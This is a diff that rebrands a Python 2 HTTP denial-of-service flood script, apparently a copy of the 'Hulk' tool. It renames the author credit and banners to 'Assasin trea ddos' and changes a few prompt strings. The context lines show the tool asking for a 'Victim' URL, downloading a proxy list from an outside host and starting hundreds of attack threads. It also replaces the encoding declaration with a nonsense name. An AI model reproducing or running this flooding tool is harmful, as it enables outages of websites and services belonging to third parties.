@@ -1,6 +1,6 @@
 #!/usr/bin/env python
-#coding: utf-8
-#..:: > Hulk V6 < ::.. Fucked By CheXanh :v
+#coding: Xsarjame
+#..:: > assasin trea < ::.. Xsarjame :v
 
 import random
 import socket
@@ -15,7 +15,7 @@ import optparse
 import os
 import urlparse
 
-#Hulk Fucked By CheXanh :v
+#assasin trea Xsarjame :v
 url=''
 host=''
 headers_useragents=[]
@@ -683,10 +683,10 @@ class attacco1(threading.Thread):
                 proxy = random.choice(listaproxy).split(':')
 
 #Main
-print '\n\t..:: > Fucked By CheXanh :v < ::..'
-print '\t  ==> #~~ Super  DDOS ~~# <==  '
+print '\n\t..:: > By Xsarjame :v < ::..'
+print '\t  ==> #~~ Assasin trea ddos ~~# <==  '
 # Site
-url = raw_input("Victim: ")
+url = raw_input("Victim ip: ")
 host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
 #Proxy
 proxyf = urllib.urlopen("https://350adf0c87a0387a8100df99cb67bc325c711efb.googledrive.com/host/0B03s85BjEAHVfkpJaVZKdDFnQ25VTEJsZE5FMzhwUjBOa1VLUFdtRDhSR01qenZ1M1hZMWs/yyy.txt").read()
@@ -698,7 +698,7 @@ accept = "Accept-Encoding: gzip, deflate\r\n"
 connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
 nload = 1
 x = 0
-print("\tHulk DDOS Fucked By CheXanh :v")
+print("\tAssasain trea DDOS Attack By xsarjame :v")
 if url.count("/")==2:
     url = url + "/"
     m = re.search('http\://([^/]*)/?.*', url)
@@ -707,7 +707,7 @@ for x in xrange(int(thread + 1)):
     attacco().start()
     attacco1().start()
     time.sleep(0.002)
-print "Attacking..."
+print "startAttacking..."
 for x in xrange(501):
 	t = HTTPThread()
 	t.start()
